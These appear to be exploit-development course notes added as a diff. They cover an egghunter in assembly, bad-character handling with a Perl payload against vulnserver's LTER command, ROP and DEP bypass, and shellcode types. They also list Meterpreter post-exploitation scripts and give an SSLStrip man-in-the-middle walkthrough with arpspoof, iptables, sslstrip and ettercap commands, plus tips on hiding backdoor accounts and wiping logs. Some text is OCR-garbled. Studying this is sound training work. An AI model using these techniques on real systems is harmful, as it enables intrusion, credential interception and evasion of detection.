+		create_SEH handler:
+			PUSH ECX; SEH_frames[0].nextframe == 0xffffffff
+			MOV [FS:EAX], ESP;	SEH_chain -> SEH_frames[0]
+			CLD ; SCAN memory upwards from 0
+	
+	Scan loop
+		scan loop:
+			MOV AL, egg_size ; EAX = egg_size
+		egg_size_location equ $-1 - $$
+			REPNE SCASB ; Find the first byte
+			PUSH EAX ; Save egg_size
+			MOV ESI, EDI
+			LODSD ; EAX = || M2 M3 M4
+			XOR EAX, (marker << 8) + 0xFF ; EDX = (|| M2 M3 M4) ^ (FF M2 M3 m4) == egg_index
+		marker_bytes_location equ $-3 - $$
+			CMP EAX, BYTE max_index ;
+			;Check if the value of EDX is < max_index
+		max_index_location equ $-1 - $$
+			JA reset _ stack ; No -> This was not a marker, continue scanning
+	
+	Egg placement and copy
+		POP ECX ; ECX = egg_size
+		IMUL ECX ;
+		; EAX = egg_size * egg_index == egg_offset
+		; EDX = 0 because ECX * EAX is always less than 0xl,000,000
+		ADD EAX, [BYTE FS:EDX + 8] ;
+		;EDI += Bottom of stack == position of egg in shellcode.
+		XCHG EAX, EDI
+		copy_loop:
+			REP MOVSB ; copy egg to basket
+			MOV EDI, ESI ; EDI = end of egg
+			
+	Clean up after each egg
+		reset _ stack:
+		; Reset the stack to prevent problems
+		;caused by recursive SEH handlers and set
+		;ourselves up to handle and AVs we may
+		;cause by scanning memory:
+		XOR EAX, EAX ; EAX = 0
+		MOV ECX, [FS:EAX] ; EBX = SEH_chain => SEH_frames[X]
+		find_Iast_SEH_loop:
+			MOV ESP, ECX ; ESP =  SEH_frames[X]
+			POP ECX ; EBX =  SEH_frames[X].next_frame
+			CMP ECX, 0Xffffffff;
+			;SEH_frames[Xl.next_frame == none ?
+			JNE find last SEH_Ioop ; No "X -= 1", check next frame
+			POP EDX ; EDX = SEH_frames[0].handler
+			CALL create_SEH_handIer ;
+			;SEH_frames[O].handler == SEH_handler
+			
+	Our SEH handler
+		SEH_handler:
+			POPA ; ESI = [ESP + 4] -> struct exception_info
+			LEA ESP, [BYTE ESI+0x18] ;
+			;ESP = struct exception_info->exception_address
+			POP EAX ; EAX = exception address 0x????????
+			OR AX, 0xFFF ; EAX = 0x?????FFF
+			INC EAX ; EAX = 0x?????FFF + 1 -> next page
+			JS done ;
+			done
+			;EAX > OX7FFFFFFF ===> done
+			XCHG EAX, EDI ; EDI => next page
+			JMP reset_stack
+			
+	Finally
+		done:
+			XOR EAX, EAX ; EAX = 0
+			CALL [BYTE FS:EAX + 8] ; EDI +=	Bottom of stack ==	position of egg in shellcode.
+			
+			db marker _ bytes _ location
+			db max_index_location
+			db egg_size_location
+			
+
+Restricted Character Set
+	What is a restricted character set?
+		
+		Checking or filtering functions
+			Only allow certain characters Into the buffer
+		Input filtering rules In order to be accepted as "valid" Input
+		
+		Example Is the LTER vuln In vulnserver:
+			- We can trigger an exception in the program by sending a LTER command with a parameter
+			  consisting of a long (~2010 characters or more) string including at least one full stop(.) character.
+			- If we try to trigger the vuln without the stop character, our input will be rejected as invalid and the overflow/exeption
+			  will never occur
+			  
+	
+	Example
+	Lets send a payload that contains many \x41 and \xCC characters:
+		
+		$badheader = "LTER.";# sets variables $badheader to LTER."
+		$baddata = "\x41" x 2006;
+		$baddata .= pack ('V', 0x625011AF);# JMP ESP, essfunc.dll
+		$baddata .= "\xCC" x (3000 - length($baddata));
+	
+	When we look In a debugger our \xCCs have been parsed and changed to \4Ds:
+	
+	Bad Characters
+		Send a list of all possible characters to the application
+			Which ones are still unaltered?
+		We can send the following payload that Includes all possible
+		characters:
+
+				"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11"
+				"\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+				"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
+				"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e"
+				"\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d"
+				"\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c"
+				"\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b"
+				"\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a"
+				"\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89"
+				"\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98"
+				"\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7"
+				"\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
+				"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5"
+				"\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4"
+				"\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3"
+				"\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2"
+				"\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+				
+	Result
+		
+		As soon as we get to byte 0x7F, we don't see the expected byte 0x80
+		following It, Instead we see 0x01, followed by Ox02, Ox03 and so on
+		all the way through to Ox80.
+		
+		All characters over 0x7F (highlighted In grey) the program seems to be
+		subtracting 0x7F from the byte value sent.
+		
+	Unicode filtering
+		Is there something significant about the byte value Ox7F that might account for
+		this?
+			- 0x7F is the point where the ASCII character set terminates.
+			- This program is expecting to receive ASCII characters
+			- Somewhere in its execution it mangles any characters that don't fall into this range.
+	
+		We can only use allowed characters within the 0x01 - 0x7F range Assuming that 0x00,0x0A and 0x0D will probably also be bad and unusable
+	
+		"JMP ESP" Instruction AND our shellcode cannot contain these bytes
+	
+	
+	Dealing with Bad Characters
+		
+		For our exploit, lets find a "JMP ESP" instruction at an address in memory that does not
+		require the use of any of our identified bad chÜacters.
+	
+		Using ollydbg we can search for JMP ESP commands:
+		
+		Address		Disassembly			Comment
+		62501000	PUSH EBP			(Initial CPU selection)			
+		625011AF	JMP	 ESP
+		625011BB	JMP	 ESP
+		625011C7	JMP	 ESP
+		625011D3	JMP	 ESP
+		625011DF	JMP	 ESP
+		625011EB	JMP	 ESP
+		625011F7	JMP	 ESP
+		62501203	JMP	 ESP
+		62501205	JMP	 ESP
+		
+		Looking at the addresses of the instructions, we can see two addresses that should be suitable, at 0x62501203 and 0x62501205
+	
+	Alphanumeric Shellcode
+		As It turns out, there Is shellcode and shellcode encoders written specifically to deal with the problem
+		
+		One such encoder exists In Metasploit.
+	
+		Our allowed set makes both upper and lower case characters available to us
+		
+		We will use the x86/ alpha_mixed encoder
+		
+		There Is one thing to be aware of when using this encoder however — It Is a Metasploit implementation of the 
+		ALPHA2 encoder, which needs to know its position in memory In order to function.
+		
+		The Metasploit implementation adds its own code to determine its position In memory to the start of the encoder
+			
+			Not Alphanum
+		
+		We can provide a sparsely documented command line option "BufferRegIster" to msfencode to specify a register
+		that contains the position of the shellcode In memory.
+		
+	Process recap
+		To recap:
+		
+		1. Identify that vulnerable buffer Is altering Input
+		2. Determine what range of Input Is unaltered
+		3. Modify exploit to use characters only within this range
+		4. Profit!
+		
+Return-Oriented Programming
+	Module Overview
+		Operating system protections
+		What Is ROP?
+		Why do we need it?
+		How do we go about it?
+		
+	Operating System Protection
+		Windows DEP Modes
+			Optin
+			Optout
+			AlwaysOn
+			AlwaysOff
+		Started with XPSP2
+		
+	Previously
+		Overwrite/Stea1 EIP
+		Shellcode
+		Profit
+	
+	After DEP
+		Overwrite/Steal EIP
+		Shellcode
+			Gadgets
+			Change Memory Protection
+			
+		Shellcode
+		Profit
+
+	Ret21ib (Return To Library) Attack
+		What Is Return2Lib?
+		What is ROP?
+	
+	What are gadgets?
+		Small sets of Instructions followed by Return
+		Examples:
+			Pop reg; ret;
+			Add reg; ret;
+			Add reg; pop reg; ret;
+		Return +X is acceptable
+		
+	
+	Memory Protection functions
+		VirtualProtect
+		VirtualAlloc
+		SetProcessDEPPolicy
+	
+	VirtualProtect
+		BOOLWINAPI VirtualProtect(
+		_In_ LPVOID IpAddress,
+		_In_ SIZE_T dwSize,
+		—In_ DWORD fINewProtect,
+		_Out_ PDWORD IpfIOIdProtect);
+		
+	
+	VirtualAlloc
+		LPVOID WINAPI VirtualAlloc(
+		_In_opt_ LPVOID IpAddress,
+		_In_	SIZE_T dwSize,
+		_In_	DWORD fIAllocationType,
+		_In_	DWORD FIProtect);
+	
+	SetProcessDEPPolicy
+		BOOL WINAPI SetProcessDEPPolicy(
+		_In_ DWORD dwF1ags);
+	
+	Memory Protection Constants
+		PAGE_EXECUTE = 0x10
+		PAGE_READWRITE = 0x04
+		PAGE_EXECUTE_READWRITE = ox40
+		We are most concerned with the last.
+	
+	Back to Gadgets
+		Loading and storing
+			register to register
+				Mov Reg, Reg;
+			register to memory
+				Mov Reg, [Reg];
+				Push;
+			memory to register
+				Mov [Reg], Reg;
+				pop;
+				
+		Searching in ImmDbg
+			Mov RA, [RB]
+		
+		ROP Gadgets (arithmetic operations)
+			ADD
+			SUB
+			MUL
+			DIV
+			XOR
+			SHR/ROT...
+		
+		Handling NULL Bytes in a ROP payload
+			0xffffffff
+			  XOR
+			0xffffffff
+		----------------
+			0x00000000
+	
+	Other Obstacles
+		Ret+4 Example
+				0x 56654321 ADD SomeReg, 10; Ret 4;
+		
+			0x56654321
+			0xFFFFFFFF
+			Next to execute here
+		
+		Not enough pointer gadgets
+			Get all your addresses In register
+			PUSHAD
+			Puts all general purpose registers on the stack
+			EAX,ECX,EDX,EBX,EBP,ESI,EDI
+		
+		Not enough space after our ROP chain
+			Add relative jumps
+			
+	Payloads
+		Payload Use
+		- Too little thought goes into choosing the correct payload for the pentest
+			can have disastrous consequnces
+			Can prevent pen testers from determining true risk of a vulnerable system
+		
+		- Most common shellcode types
+			Bind Shell
+			Reverse Bind Shell
+			Execute command (Upload & Execute)
+			Manipulate specific API (netapi32.dll)
+			Find Socket
+			syscall proxy
+			DLL Inject
+			Encrypted tunnel
+		
+		Bind Shell	
+			- Fork/spawn a process
+			- Open a listening socket
+				Bind socket to shell interpreter (cmd.exe, /bin/sh)
+				Must connect back into target to issue commands
+				Relies on firewall not in place or misconfigured
+			- You can sometimes stomp over an existing process
+			- Exclusive vs. Inexclusive bind (inetinfo vs ftp)
+		
+		Reverse Connect
+			Reverse connect delivers shell back to attacker	
+				- Establish outbound connection to listening port
+				- Don't forget to establish the listener!
+				- Metasploit listener is on 4444
+			
+			Useful in situations without proper egress filtering
+				- Sometimes you can connect back on any port
+				- Always try 80/tcp 443/tcp 21/tcp
+				- 53/udp is a good guess as well
+		
+		Execute Command
+			Execute command shellcode can come in two varieties
+				- First: pass command to command Interpreter
+				- Sometimes may include a download/execute or upload/execute
+				- What if box is secured and cmdexe is deleted?
+			
+			- Manipulate API is always a better execute command shellcode
+			- Create local admin shellcodes
+				- This payload Will load netap132dll and call NetUserAdd followed by NetLocalGroupAddMembers.
+				- Has the advantage of never binding a shell!
+				- Harder to pick up normal access via an admin account
+				- Great to launch against Domain Controllers
+		
+		Find Socket!
+			Find Socket is the most recent shellcode type
+				Idea is to reuse the socket that the exploit was launched on
+				Therefore we don't have to create a new Inbound or outbound connection
+				Hard part is finding the correct socket (think of a web server)
+			
+			Finding socket
+				Set a strange source port (1, 31337, 65535)
+				Search sockets for inbound connection With strange source port
+				Packet scrubbing proxy will make this shellcode not work
+				Xfocus — 4 byte hash in memory
+				
+		Syscall Proxy
+			
+				Process
+				   |
+				   |
+				   v
+				OS services
+				(system calls)
+				   |
+				   |
+				   v
+				Resources
+				
+			System call Proxy  				 ___________________
+			 __________________   			|					|
+			|	Process		   |	 ------>| 	Syscall server	|
+			|		|		   |	|  		|		|			|
+			|		|		   |	|  		|		|			|
+			|		v		   |	|  		|	OS services		|
+			|	Syscall client |----		|		|			|
+			|				   |			|		|			|
+			|				   |			|		v			|
+			|				   |			|	resource		|
+			|				   |			|					|						
+			|	Workstation	   |			|	Server			|					
+			|__________________|			|___________________|	
+		
+		DLL Injection
+			DLL Injection shellcode
+				Add another executable module to an existing process
+				Allows us to run arbitrarily complex shellcode on a windows system
+		
+			VNC Server Inject
+				Inject an entire VNC server into another processes address space
+				Better than actually installing VNC server, because no forensic evidence is left on
+				disk
+		
+		Advanced Exploitation
+			Modify public exploits
+			Most IDSs detect exploits Vla the NOP sled (0x90s)
+			Many instructions can be used in place (INC EDX. DEC EDX, etc)
+			Consider randomizing the NOP sled
+			If you know your target, you may be able to hardcode addresses and remove the NOP sled entirely
+		
+		Use connectback or reverse connect shellcode
+			Remove local bind shellcode
+			Firewall or NAT may prevent you from making an inbound connection to the exploited box
+			Shellcode.com.ar
+			Metasploit.org
+		
+		Look for hardcoded exploits, some examples:
+			IIS Webdav
+			IIS PCT
+			Windows JPEG
+			Apache Chunked
+	
+	From Vulnerability to Exploit
+			
+			 -------------					 -------> 	Debugger <--------------			 
+			|  Fuzzing	  |					|				|					|
+			 -------------					|			Attack Vector			|
+				 |							|				|					|
+				 |							|			Reliable EIP return		|
+				 v							|			  address				|
+			-----------------				|				|					|
+		   |EIP = 0x41414141 | -------------			Bad characters			|
+			-----------------								|					|
+														Test Shellcode			|
+														  (INT 3)				|
+															|					|
+					 ------------------------------------  INT 3 ---------------
+					|									   
+					v	
+				Final Shellcode
+					|
+					v
+				Working exploit
+					|
+					v
+				Shellcode Handling
+				
+
+#Metasploit Payload
+	
+	Metasploit Meterpreter
+	- An advanced post exploitation payload 
+	- Ruby modules that automate common post exploitation tasks
+	- Very user friendly
+	- Extremely powerfull
+	
+	Useful Meterpreter Scripts
+	- Hash Dump - allows dumping of victim hashes
+	- Screenshot - Takes a screenshot of victim computer
+	- Timestomp - Modifies MACE attributes of any file
+	- Migrate - Allows migrating from one running process to another.
+	- Keyscan - Basic keystroke logging on victim
+	- Clearev - wipes windows Event logs
+	- Credential collector - Grabs credentials from different locations on windows machines.
+	- Quick and dirty way to attempt to get at least some credentials immediately after exploitation
+	- Sometimes causes security software to go alarm!
+	- Killav - kills vaarious well known Anti-virus proccesses.
+	- May be a good idea to use before using credentials collector.
+	- Reports back on AV found and destroyed
+	- Checkvm - checks to see if the compromised machine is running in a virtualized environment.
+	- Limited if key VM proccesses are not running at the time of exploitation
+	
+	
+	Windows Adduser Paylaod
+	- Allows the adding of a user account with specified credentials
+	- Useful for creating a post exploitation backdoor account quickly
+	- Best to create an account name that looks similar to existing accounts.
+	
+	
+	Writing a Metasploit Module
+	- Metasploit exploits are writtern as Ruby Modules
+		- Allows us to abstract socket programming, shellcode writing
+		- We can understand the mechanics of the overflow without having to worry about programming details
+		- Plug and play!
+
+# Advanced Metasploit
+	Metasploit Framework
+	- The Metasploit framework is an advanced open-source platform for developing, testing, and using exploit
+	  code.
+		- website states it started off as a "portable network game"!
+	
+	- The framework was writtern in the perl scripting language and includes various components writtern in C, assembler, and Python
+		- can run on any OS with a perl interpreter
+		- comes with over 60 exploit for many different platforms
+		
+	> show exploits
+	> use iis50
+	> set PAYLOAD
+	> set pxe
+	
+	
+	Running Commands Remotely
+	- Linux and Unix provides a very powerful CLI,we can do almost everything via the command line
+	- if you get a gtk or other "GUI" error, look for associated CLI command
+	- if GUI must be used, setup X11 port forwarding
+		For stealth, use ssh port forwarding
+	- Windows is another story
+	
+	
+	Running Commands Remotely On Windows
+	- Windows has limited command line functionality
+	- Options are:
+	- Use a "remote process execute" program
+			psexec from Sysinternals
+			at
+			must have cracked a password for a user account, might need admin privs
+	- Try to make do with existing CLI utils
+			net(user, stop, start, use, share, localgroup, etc.)
+			tftp
+			ftp
+			telnet
+			
+			at
+			start
+	
+	- if you cannot do that you want with the Windows CLI, you must interact with the GUI or Desktop
+	- Option are:
+	- Access or install a remote GUI application (PC Anywhere, WinVNC, Terminal Services)
+	- Use command line programs that have permissions to "Interact with Desktop"
+			at /interactive
+			guistart
+			psexec -i
+			
+	- Metasploit Stack Overflow
+	
+				 ___|_______________________|
+				|	| local variable buffer |
+				|	|_______________________|
+				|	| local variable c		|
+				|	|_______________________|
+				|	| reference parameter b	|___	
+		process-|	|_______________________|	|
+				|	| parameter a			|	|
+				|	|_______________________|	|	
+				|___|return address(in main)|	|
+				 ___|_______________________|	|
+				|	| variable y			|	|
+		  Main -|	|_______________________|<--	
+				|	| variable x			|
+				|___|_______________________|
+					|						|
+					|						|	
+					
+						 ___|_______________________|
+						|	| hacker data (NO-OP)   |
+						|	|_______________________|
+						|	| ...overflow (NO-OP)	|___
+						|	|_______________________|	|
+						|	|code to set up backdoor|	|
+				process-|	|_______________________|	|
+						|	| 	etc.				|	|
+						|	|_______________________|	|	
+						|___|new "return" address	|	|
+						 ___|_______________________|	|
+						|	| variable y			|	|
+				  Main -|	|_______________________|<--	
+						|	| variable x			|
+						|___|_______________________|
+							|						|
+							|						|	
+							
+							
+	
+	- Exploiting stringmatchserver
+	
+		<----------------------------------------------------------------------------->
+		 ___________________ __________________ ______ ________________ ____________ _____________________ _______
+		|(Unused stack)		| local variables  | EBP  | Return Address |Arguments	|Previous stack frame |		  |
+		|___________________|__________________|______|________________|____________|_____________________|_______|
+		|					|		Padding			  |Address of	   |  NOPs..				|	Exploit Code  |
+		|___________________|_________________________|___exploit______|________________________|_________________|		
+															|										   ^	
+															|__________________________________________|
+															
+		----------------------------------------------------------------------------------------------------------->
+							Higher addresses . Exploit copied on this direction 
+							
+	
+	- Writing a Metasploit Module
+	
+		- Metasploit exploits are written as ruby Modules
+			- Allow us to abstract socket programming, shellcode writing
+			- We can understand the mechanics of the overflow without having to worry about programming details
+			- Plug and play!
+
+# Client Side V/S Server Side
+	- Server side more traditional
+	- Servers have services used by clients.
+	- Traditional attacks would exploit services by "posing" as a legitimate client
+	- Then communicate in a malicious way or deliver malicious payloads.
+	- Client side more modern
+	- Malicious attacker poses as or IS a "server"
+	- Client is tricked  or forced  into communicating with malicous server.
+	- Server then exploit weaknesses in the client.
+	
+	
+	- Why client side is popular
+		- High success rate
+		- Often exploits the weakest link, people.
+		- Good for evading intrusion detection and firewalls; attack is initiated by the victim usually.
+		- Traditional countermeasures are ineffective.
+		
+	
+	
+	
+	- The advanced Persistent threat
+									Defeated By
+	Firewall/IDS	------------------------------------->  Client side attacks social engineering  --------------------------------
+									Defeated By																						|
+	Antivirus		------------------------------------->  Convert Channels/AV Evasion --------------------------------------------|	
+																																	|
+	User Awareness training on      Defeated By  			Browser base client side Attacks										|
+	emails from unknown sources ------------------------->  "Non-traditional" Social Engineering------------------------------------v
+																																	APT
+									Defeated By																						^
+	Prohibiting External Storage/ ------------------------>  Physical Access Cutting Edge Hardware ---------------------------------|
+	Thumb Drives											 Attacks																|	
+																																	|	
+									Defeated By																						|
+	Good Security Policies	----------------------------->   Social Engineering Reconnaissance Patience ----------------------------
+	
+	
+	
+	
+	- APT Attacks New?
+	
+		- Not always new attacks
+		- Old attacks delivered in the form of new
+		  combinations
+		- Each attack individually and quickly don't work
+		  anymore
+		- Attacks combined and spread out over an extended
+		  period are lethal and nearly impossible to detect and
+		  prevent
+	
+	- What security people do well..
+		- Traditional Intrusion Prevention and Detection
+		- Traditional Attack Simulations (regular penetration tests)
+		- Traditional Incident Response
+		- Traditional Forensics
+		
+# Advanced Client Side Exploits pt. 2
+	
+	- What security people suck at...
+		- Combining the skills they have across the board
+		- Defending against internal threats
+		- Correlating logs and events over extended periods.
+		- Thinking like the h@ck3rs
+		- Being "patient"
+	
+	- Internal Security
+		- The average internal security looks like cheese holes
+		
+	- Outbound dectection/Extrusion
+		- What your egress/outbound security looks like
+		
+		- so much effort is put into what's coming in. what about what's walking out the front door?
+		
+	
+	- Anantomy of a Client Side Attack
+		- Myth: You haev to be stupid enough to click on stupid things or visit stupid website to be hit by client side attacks
+		
+		- Fact: Turning on your computer makes even the most security savvy security pro vulnerable to client side attacks.
+	
+	- Why they are hard to stop 
+		- Client Side attacks all have several things in common.
+			- They are attacks which are started by a trusted party (internal employee/device)
+			- There's ususally no "patch" for them
+			- Fringe application (Adobe Reader, Winzip, VLC player, etc) are common targets
+			- Most don't look at egress
+			
+	
+	- Typical APT attack 
+		- Target is picked and watched passively. For months or YEARS.
+		- Attacker recons CFO. Finds out everything there is to know about the CFO.
+		- It is discovered that the CFO visits a Starbucks across the street from her corporate omce at least 2	
+		  times per week.
+		- Attacker hangs out at Starbucks waiting for CFO to visit.
+		- CFO visits and performs her normal activities.
+		- Earlier the attacker has the discorvered the target companies OWA (Outlook Web Access) web mail front end. He has also saved a copy of
+		  this page locally.
+		- He then adds some malicious code to his local version of the target companies OWA page.
+		- He now has this page sitting on a web server he's set up and it's now waiting for connections
+		- Attacker ARP Spoofs the CFO and set's up a DNS spoofing attack. When the CFO visits the company
+		  web page, she's actually visiting a copy controlled by the attacker.
+		- Attacker is now Attacker is now "on" the CFO's laptop. He sits and sniffs,maps, and waits for six months perhaps
+		  YEARS, before doing anything else. Next level rootkits makes the attackers presence virtually undetectable.
+		- Attacker methodically, plants himself into other vulnerable devices inside the corporation.
+		
+
+# Attacking Network Based Protocols
+	- Attacking ARP
+	- Attacking SSL
+	- Traffic Manipulation
+	
+	- What we trust 
+		
+			HTTP
+			
+			HTTPS 
+			
+			
+	- Famous last words..
+		- Most cipher strengths for SSL these days is 256 bit.
+		- It would take forever to break this!
+		- It's impossible to break it in any reasonable amount of the time. 
+		WHo says we have to break it 
+		
+		
+	- The process
+		
+		Web Client 																Web Server
+						Handshake start, Client Random
+						Support Cipher Suites, Supported Compression
+						algorithms
+					---------------------------------------------------------->   	
+
+						Server Random
+						Decided Cipher Suite 
+						Decided Compression Algorithms
+						Server certificate 
+						Server Public Key
+					<----------------------------------------------------------
+					
+					
+					Client Certificate
+					Client Public Key
+					Encrypted Premaster Secret
+					Handshake finished
+					---------------------------------------------------------->
+					
+					
+			=====================================================================================
+										Handshake Finished										||
+					<-----------------------------------------------------------				||
+										Application Data										||
+					<----------------------------------------------------------->				Encrypted and compressed
+					
+					
+	
+	- What if 
+		- There were away to get around the encryption instead of trying to break it?
+		
+		- For example, attack the transition from unecrypted HTTP to encrypted HTTPS/TLS?
+		
+		
+	- That "way" is SSLStrip
+		- Essentially, we do a man in the middle between the victim and the default gateway
+		
+		- Once we've got the traffic, ssltrip will then create a fake valid certificate, mimicking our target web server.
+		
+		
+	- Certificate chaining
+		- It works by making whatever your target is, yahoo.com for example, a leaf or child of our own domain.
+		- This domain could be infosecinstitue or whatever domain you want. As long as the domain has a valid certificate itself.
+		
+		- SSLStrip automates this all and does it for us.
+		
+	
+	- When you get a cert verification goes all the way back to a root Certificate Authority, Like Verisign
+	
+	
+	Root 						ROOT CA (Verisign)							Cert trusted!
+																			Verification
+									^										stops here!
+									|										
+									|
+									|
+	Cert issued by				Intermediate CA (Geo-trust class 3)			Cert not trusted
+	Verisign																but kinda
+									^
+									|
+									|
+									|
+	Cert issued by				Leaf (infosecinstitue.com)					Cert not trusted
+	Geo-trust to					
+	infosec							^
+									|
+									|
+									|
+	Cert Issued by				Leaf										Cert not trusted
+	infosec						(gmail.com.infosecinstitue.com)
+	
+	
+	
+	
+	
+	- Analogy
+	
+		- Think of the Chicago thing...
+		- "I don't know this guy but
+		- I know a guy, who knows a guy, who knows this guy, and that guy says this guy is ok and can be trusted. 
+		  We don't trust the leaf, nor do we trust intermediates, but we DO trust the Root, Verisign.
+		- Verisign vouched for the intermediate, the intermediate vouches for infosecinstitute.com, and infosecinstitute.com vouches for
+		  gmail.infosecinstitute.com
+	
+	- The rest is "candy from a baby" work.
+		- If we can have a "valid" certificate for yahoo.com, then all the intermediate certs in your browser will trust it.
+		  Because it's coming as a child/ leaf of another valid cert (our real cert).
+		- Visualize it this way...
+			- yahoo.com is valid. But so is. .....
+			- yahoo.com.infosecinstitute.com if infosecinstitute.com has a signed/ valid cert of it's own!
+	
+	- Therefore..
+		- When we present the client with our forged cert, it will be taken as valid, and the victim won't see the big "this
+		  certificate cannot be validated" warning. This is why you didn't see any pop-ups in the video from the client/ victim
+		  perspective.
+		- Ironically, 99% of the world will just click accept anyway. But "smart" folks wont.
+	
+	- What it looks like
+		- Basically the connection between sslstrip and the real https
+		  server will be true ssl.
+		- At the sarne time the session between sslstrip and the victim is plain old http. So when they send their credentials it's
+		  really going to sslstrip as cleartext. Then sslstrip proxies these credentials to the real server via SSL.
+	
+	- The commands
+		- arpspoof -t 192.168.1.132 192.168.1.1
+		
+		Arpspoof basically sends arp replies to the target of 192.168.1.132 (target ip is the one followed immediately by the -t (target).
+		The second ip 192.168.1.1 is the ip we're "pretending" to be.
+		Essentially we're telling the target 132 that we're the gateway which is 1.
+	
+	
+		- iptables -t nat -A PREROUNTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+			- iptables command starts iptables
+			- -t = tables
+			- nat = this table is consulted when a packet that creates a new connection is encountered.
+			- -A is an instruction to append one or more rules to the accepted chain.
+			- PREROUTING is one of the builtins of the NAT table option. It is for altering packets as soon as they come in.
+			- -p specifies a protocol, in this case we said tcp
+			- --destination-port we specify port 80 as the destination port
+			- -j specifies an action. And we follow that with the action of redirect (REDIRECT).
+			- We redirect to port 10000 because this is the port sslstrip listen on by default
+			
+	
+		- sslstrip -a -k -f
+			- -a logs all ssl traffic to and fronn the server (the builtin server in sslstrip).
+			- -k kill all sessions in progress (forces the target ssl session to restart if already going, allows for the tool to work on
+			  sessions already established)
+			- -f substitute a lock favicon on all requests
+			
+			
+		- ettercap -T -q -i eth0
+			-T simply specifies text only mode.
+			-q specifies quiet mode. Does not print packet content (since we don't need this)
+			-i ethO specifies ethernet 0 (zero) as the interface to listen on.
+		
+		- echo 1> /proc/sys/net/ipv4/ip_forward
+			- This command enables ip forwarding by writing the value of 1 in the file specified in the path. To toggle
+			  this setting of, you would replace the 1 with a 0 (zero).
+			
+			- Remember to do any mitm we need our box to act like a router and be able to forward packets that does not
+			  have it's ip address in it as the destination.
+		
+		- Ettercap
+			- Can automate Man-in-the-middle attacks.
+			- Has filters that allows for find and replace type functions in certain types of traffic, e.g. http html.
+			- Nice for forcing malicious code into http traffic streams in real time.
+			- Works against trusted sites which the client might allow to execute code, active x, etc
+			
+
+# Exploiting Web Apps
+	- Web App Scanning
+		
+		- There are several tools that specifically look for vulnerabilities in web
+		  applications
+			- SPI Dynamic's Web Inspect
+			- Santcum's AppScan Line
+			- Kavado• Scando
+			- Nikto (uses LibWhisker)
+		
+		- Work well under some circumstances 
+			- Nothing beats manual investigation.
+			
+	
+	- Web Inspect
+		- There are several tools that specifically look for vulnerabilities in web app.
+			- SQL Injection
+			- XSS
+			- Session Manipulation
+		- Support HTTPS
+		- Can attack a wide variety of commercial web application
+			- Microsoft .NET
+			- IBM Websphere
+			- Macromedia Coldfusion
+			- Lotus Domino
+			- Oracle Application Server
+			- Macromedia JRUN
+			- BEA Weblogic
+			- Jakarta Tomcat
+			- Forte
